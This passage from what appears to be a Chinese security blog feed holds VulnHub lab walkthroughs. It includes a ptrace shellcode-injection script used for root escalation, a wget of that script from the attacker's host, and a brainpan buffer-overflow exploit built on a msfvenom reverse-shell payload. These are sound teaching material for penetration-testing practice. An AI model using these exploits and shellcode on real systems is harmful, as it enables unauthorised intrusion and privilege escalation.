operator">=</span> <span class="token number">16</span>PTRACE_DETACH <span class="token operator">=</span> <span class="token number">17</span><span class="token comment"># Structure defined in &lt;sys/user.h></span><span class="token comment"># https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct</span><span class="token keyword">class</span> <span class="token class-name">user_regs_struct</span><span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>Structure<span class="token punctuation">)</span><span class="token punctuation">:</span>    _fields_ <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token punctuation">(</span><span class="token string">"r15"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"r14"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"r13"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"r12"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rbp"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rbx"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"r11"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"r10"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"r9"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"r8"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rax"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rcx"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rdx"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rsi"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rdi"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"orig_rax"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rip"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"cs"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"eflags"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rsp"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"ss"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"fs_base"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"gs_base"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"ds"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"es"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"gs"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>libc <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>CDLL<span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">)</span>pid<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># Define argument type and respone type.</span>libc<span class="token punctuation">.</span>ptrace<span class="token punctuation">.</span>argtypes <span class="token operator">=</span> <span class="token punctuation">[</span>ctypes<span class="token punctuation">.</span>c_uint64<span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_uint64<span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_void_p<span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_void_p<span class="token punctuation">]</span>libc<span class="token punctuation">.</span>ptrace<span class="token punctuation">.</span>restype <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>c_uint64<span class="token comment"># Attach to the process</span>libc<span class="token punctuation">.</span>ptrace<span class="token punctuation">(</span>PTRACE_ATTACH<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>registers<span class="token operator">=</span>user_regs_struct<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># Retrieve the value stored in registers</span>libc<span class="token punctuation">.</span>ptrace<span class="token punctuation">(</span>PTRACE_GETREGS<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>byref<span class="token punctuation">(</span>registers<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Instruction Pointer: "</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>registers<span class="token punctuation">.</span>rip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Injecting Shellcode at: "</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>registers<span class="token punctuation">.</span>rip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c</span>shellcode <span class="token operator">=</span> <span class="token string">"\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"</span><span class="token comment"># Inject the shellcode into the running process byte by byte.</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Convert the byte to little endian.</span>    shellcode_byte_int<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span>i<span class="token punctuation">:</span><span class="token number">4</span><span class="token operator">+</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    shellcode_byte_little_endian<span class="token operator">=</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&lt;I"</span><span class="token punctuation">,</span> shellcode_byte_int<span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>    shellcode_byte<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>shellcode_byte_little_endian<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token comment"># Inject the byte.</span>    libc<span class="token punctuation">.</span>ptrace<span class="token punctuation">(</span>PTRACE_POKETEXT<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_void_p<span class="token punctuation">(</span>registers<span class="token punctuation">.</span>rip<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>shellcode_byte<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Shellcode Injected!!"</span><span class="token punctuation">)</span><span class="token comment"># Modify the instuction pointer</span>registers<span class="token punctuation">.</span>rip<span class="token operator">=</span>registers<span class="token punctuation">.</span>rip<span class="token operator">+</span><span class="token number">2</span><span class="token comment"># Set the registers</span>libc<span class="token punctuation">.</span>ptrace<span class="token punctuation">(</span>PTRACE_SETREGS<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>byref<span class="token punctuation">(</span>registers<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Final Instruction Pointer: "</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>registers<span class="token punctuation">.</span>rip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Detach from the process.</span>libc<span class="token punctuation">.</span>ptrace<span class="token punctuation">(</span>PTRACE_DETACH<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>kali:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-m</span> http.server <span class="token number">8088</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>靶机:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://192.168.71.139:8088/inject.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因需要root进程进行注入，编写脚本对root进程批量尝试.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">`</span><span class="token function">ps</span> -ef<span class="token operator">|</span><span class="token function">grep</span> root<span class="token operator">|</span><span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"grep"</span><span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'&#123;print $2&#125;'</span><span class="token variable">`</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span> python2.7 inject.py <span class="token variable">$i</span><span class="token punctuation">;</span> <span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/a5e7f10c/image-20221111175514443.png"></p><p>脚本执行成功，可以看到5600端口正在监听。</p><p><img src="/posts/a5e7f10c/image-20221111180927303.png"></p><p>连接5600端口，发现已获取root权限。</p><p><img src="/posts/a5e7f10c/image-20221111181139962.png"></p><p>提权完成！</p><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><p>此靶机考察的点：</p><ul><li>目录探测</li><li>域传送漏洞</li><li>XXE漏洞</li><li>STTI模板注入</li><li>linux-capabilities提权</li></ul>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>brainpan：缓冲区溢出漏洞的利用</title>
      <link href="/posts/229625f.html"/>
      <url>/posts/229625f.html</url>
      
        <content type="html"><![CDATA[<p>brainpan是vulnhub上一个类OSCP风格的靶机。<br>靶机下载地址：<a href="https://www.vulnhub.com/entry/brainpan-1,51/">https://www.vulnhub.com/entry/brainpan-1,51/</a></p><hr><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>首先用nmap扫描靶机开放端口，同时打印banner信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">--script</span> banner <span class="token number">192.168</span>.71.145<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/229625f/image-20221102084915741.png" alt="扫描结果"></p><p>发现靶机开放了9999和10000两个端口。其中10000端口是HTTP服务，9999端口未知，可以尝试用telnet先接入一下。</p><p><img src="/posts/229625f/image-20221102090022123.png" alt="10000端口页面"></p><p><img src="/posts/229625f/image-20221102090054346.png" alt="连接9999端口"></p><p>10000端口看一下网页源码，没发现特别之处。9999端口让输入密码，其它也没什么了。</p><p><img src="/posts/229625f/image-20221102090144519.png" alt="10000端口网页源码"></p><h3 id="目录探测"><a href="#目录探测" class="headerlink" title="目录探测"></a>目录探测</h3><p>利用kali自带的DIRB工具对web目录进行探测。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.71.145:10000 <span class="token parameter variable">-w</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/229625f/image-20221102090246342.png" alt="目录探测"></p><p>发现一个&#x2F;bin目录，访问看看。</p><p><img src="/posts/229625f/image-20221102090352185.png" alt="目录"></p><p>发现一个exe文件，将它下载下来在win7虚拟机里面运行。</p><p><img src="/posts/229625f/image-20221102090424651.png" alt="运行brainpan文件"></p><p>看样子是一个在监听9999端口的程序。<br>用IDA程序可以很容易得看出这个程序存在strcpy()这个危险函数且存在缓冲区溢出漏洞。</p><p><img src="/posts/229625f/image-20221102090510764.png"></p><p><img src="/posts/229625f/image-20221102090518914.png"></p><p>但是在OSCP考试中不允许使用IDA Pro，因此可以先利用strings查看程序中的字符串，看是否存在危险函数。</p><p><img src="/posts/229625f/image-20221102091347540.png"></p><p>发现存在strcpy()危险函数，可能存在缓冲区溢出漏洞。</p><h2 id="2-验证缓冲区溢出漏洞"><a href="#2-验证缓冲区溢出漏洞" class="headerlink" title="2.验证缓冲区溢出漏洞"></a>2.验证缓冲区溢出漏洞</h2><p>验证缓冲区溢出漏洞的基本思路：<br>利用代码进行fuzz找出是否存在缓冲区溢出漏洞（即查看能否控制EIP），并进行之后的确定偏移量、确定返回地址、生成shellcode。</p><h3 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h3><p>向目标程序发送很长的字符串，直到程序崩溃，确认导致程序崩溃的大概字符串长度。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> sockethost<span class="token operator">=</span><span class="token string">'192.168.71.146'</span>port<span class="token operator">=</span><span class="token number">9999</span><span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b"A"</span><span class="token punctuation">]</span>counter <span class="token operator">=</span> <span class="token number">100</span><span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">50</span><span class="token punctuation">:</span>    <span class="token builtin">buffer</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">b"A"</span> <span class="token operator">*</span> counter<span class="token punctuation">)</span>    counter <span class="token operator">=</span> counter <span class="token operator">+</span> <span class="token number">100</span><span class="token keyword">for</span> string <span class="token keyword">in</span> <span class="token builtin">buffer</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Fuzzing PASS with &#123;&#125; bytes"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>string<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/posts/229625f/image-20221102092317432.png"></p><p><img src="/posts/229625f/image-20221102092332545.png"></p><p><img src="/posts/229625f/image-20221102092353514.png"></p><p><img src="/posts/229625f/image-20221102092410868.png"></p><p>当发送字符串长度为600字节时，程序崩溃。在debugger中可以看到栈和EIP都被“A”（0x41）填满，即控制了EIP，使其指向了非法地址。</p><h3 id="确定偏移量"><a href="#确定偏移量" class="headerlink" title="确定偏移量"></a>确定偏移量</h3><p>确定多长的字符串可以刚好覆盖EIP。<br>利用kali的工具msf-pattern_create创建长度为600的字符串，发送给程序。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf-pattern_create <span class="token parameter variable">-l</span> <span class="token number">600</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/229625f/image-20221102092513918.png"></p><p><img src="/posts/229625f/image-20221102092528409.png"></p><p>发送完成后，发现EIP的值为35724134<br>利用msf-pattern_offset 工具确认偏移位置，偏移为524。</p><p><img src="/posts/229625f/image-20221102092605952.png"></p><h3 id="确定返回地址"><a href="#确定返回地址" class="headerlink" title="确定返回地址"></a>确定返回地址</h3><p>通过构造发送的字符串，EIP覆盖为想要跳转执行的代码。<br>当EIP执行”jmp esp”时，程序会接下来跳转到esp所指向的内存执行，实际上就是“返回地址”在栈里的上一个地址，由于操作系统保护机制，esp的地址是不能写死的，所以要找到程序中有没有“jmp esp”的地址可以利用。<br>这里要用到Immunity Debugger的mona插件，下载地址：<a href="https://github.com/corelan/mona">https://github.com/corelan/mona</a></p><p>安装好后，在debugger下方的指令框中输入！mona modules，它会显示出所有运行程序的保护机制开启情况。选择前四项都为false的程序，就是可进行代码地址利用的程序。</p><p><img src="/posts/229625f/image-20221102092810528.png"></p><p>看到brainpan.exe程序可以利用，使用nasm_shell来获得jmp esp的十六进制指令：</p><p><img src="/posts/229625f/image-20221102092838800.png"></p><p>为”\xff\xe4”，使用mona来寻找指令。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>mona <span class="token function">find</span> <span class="token parameter variable">-s</span> <span class="token string">"<span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xe4">\xe4</span>"</span> <span class="token parameter variable">-m</span> brainpan.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/229625f/image-20221102092928811.png"></p><p>找到了指令的位置为0x311712f3<br>因为brainpan为windows 32位小端序，所以传入EIP的值应该为\xf3\x12\x17\x31</p><h3 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h3><p>在生成shellcode前，要确定程序中有哪些“坏字符”，即不能作为代码使用的字符，每个程序中是不一样的，要在生成shellcode时避免这些字符导致的反弹shell失败。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> sockethost<span class="token operator">=</span><span class="token string">'192.168.71.146'</span>port<span class="token operator">=</span><span class="token number">9999</span>badchars <span class="token operator">=</span> <span class="token punctuation">(</span>        <span class="token string">b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x00"</span>        <span class="token string">b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x10"</span>        <span class="token string">b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x20"</span>        <span class="token string">b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x30"</span>        <span class="token string">b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x40"</span>        <span class="token string">b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x50"</span>        <span class="token string">b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x60"</span>        <span class="token string">b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x70"</span>        <span class="token string">b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x80"</span>        <span class="token string">b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x90"</span>        <span class="token string">b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xa0"</span>        <span class="token string">b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xb0"</span>        <span class="token string">b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xc0"</span>        <span class="token string">b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xd0"</span>        <span class="token string">b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xe0"</span>        <span class="token string">b"\xe1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\xf0"</span><span class="token punctuation">)</span>buff <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">524</span> <span class="token operator">+</span> <span class="token string">b'aaaa'</span> <span class="token operator">+</span> badcharss <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Done!"</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在esp处右键“follow in dump”中可以看到填入的badchars，但是发现在”\x00”处被截断了，不是本来的”\x11”，说明”\x00”是坏字符。<br>将”\x00”改成”\x01”再次发送，经过排查一切正常，没有其他的坏字符了。</p><p>利用kali的msfvenom生成shellcode，记得加-b参数排除掉坏字符。<br>直接生成靶机linux系统的shellcode。</p><p><img src="/posts/229625f/image-20221102093030822.png"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>发送给靶机，再加一段nop雪橇保护shellcode。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> socketip <span class="token operator">=</span> <span class="token string">"192.168.71.145"</span>port <span class="token operator">=</span> <span class="token number">9999</span>addr <span class="token operator">=</span> <span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span>buf <span class="token operator">=</span>  <span class="token string">b""</span>buf <span class="token operator">+=</span> <span class="token string">b"\xdb\xc4\xd9\x74\x24\xf4\xb8\x81\xbe\x52\xf0\x5e\x2b"</span>buf <span class="token operator">+=</span> <span class="token string">b"\xc9\xb1\x12\x83\xee\xfc\x31\x46\x13\x03\xc7\xad\xb0"</span>buf <span class="token operator">+=</span> <span class="token string">b"\x05\xf6\x0a\xc3\x05\xab\xef\x7f\xa0\x49\x79\x9e\x84"</span>buf <span class="token operator">+=</span> <span class="token string">b"\x2b\xb4\xe1\x76\xea\xf6\xdd\xb5\x8c\xbe\x58\xbf\xe4"</span>buf <span class="token operator">+=</span> <span class="token string">b"\x80\x33\x78\x7f\x68\x46\x87\x6e\x35\xcf\x66\x20\xa3"</span>buf <span class="token operator">+=</span> <span class="token string">b"\x9f\x39\x13\x9f\x23\x33\x72\x12\xa3\x11\x1c\xc3\x8b"</span>buf <span class="token operator">+=</span> <span class="token string">b"\xe6\xb4\x73\xfb\x27\x26\xed\x8a\xdb\xf4\xbe\x05\xfa"</span>buf <span class="token operator">+=</span> <span class="token string">b"\x48\x4b\xdb\x7d"</span>buff <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">524</span> <span class="token operator">+</span> <span class="token string">b'\xf3\x12\x17\x31'</span> <span class="token operator">+</span> <span class="token string">b"\x90"</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> bufs <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Payload send complete!"</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发送完成后，kali收到来自靶机的连接，成功反弹shell！</p><h2 id="3-提权"><a href="#3-提权" class="headerlink" 